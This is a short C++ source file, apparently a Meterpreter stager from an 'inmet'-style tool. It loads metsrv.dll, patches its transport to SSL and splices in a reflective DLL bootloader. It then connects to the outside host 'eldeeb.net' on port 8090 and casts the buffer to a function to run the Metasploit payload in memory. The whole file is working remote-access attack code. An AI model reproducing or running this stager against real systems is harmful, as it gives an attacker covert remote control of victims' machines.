//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

int wmain(int argc, wchar_t *argv[])
{
	BYTE* buffer = nullptr;
	DWORD bufferSize = 0;
	DWORD index = 0;
	SOCKET ConnectSocket = INVALID_SOCKET;
	void (*function)();
	///////////////////////////////
	// !!! Load from file stuff !!!
	///////////////////////////////
	// To be edited when options are added

	wchar_t filename[MAX_PATH] = {0};
	if(argc == 1)
	{
		wcscpy_s(filename,L"e:\\metsrv.dll");
	}
	else { wcscpy_s(filename,argv[1]);
	}

	bufferSize = CopyStageToBuffer(filename, &buffer);

	const char ReplacementTransport[] = "METERPRETER_TRANSPORT_SSL";
	//PatchString(buffer, Transport, ReplacementTransport);
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
	dprintf(L"[*] Patching transport, Offset found at 0x%08x\n", index);
	PatchString(buffer, ReplacementTransport, index, strlen(ReplacementTransport));

	index = binstrstr(buffer, (int)bufferSize, (BYTE*)"MZ", (int)strlen("MZ"));
	dprintf(L"[*] Patching ReflectiveDll Bootstrap, Offset found at 0x%08x\n", index);	
	//PatchString(buffer, ReflectiveDllBootLoader, index, strlen(ReflectiveDllBootLoader));
	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62

	ConnectSocket = get_socket("eldeeb.net","8090");
	if (ConnectSocket == INVALID_SOCKET) dprintf(L"Failed to connect...\n");

	dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
	buffer[0] = 0xBF;
	dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
	memcpy(buffer+1, &ConnectSocket, 4);
	dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	function = (void (*)())buffer;
	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");
	function();
	//function();


	return 0;
}
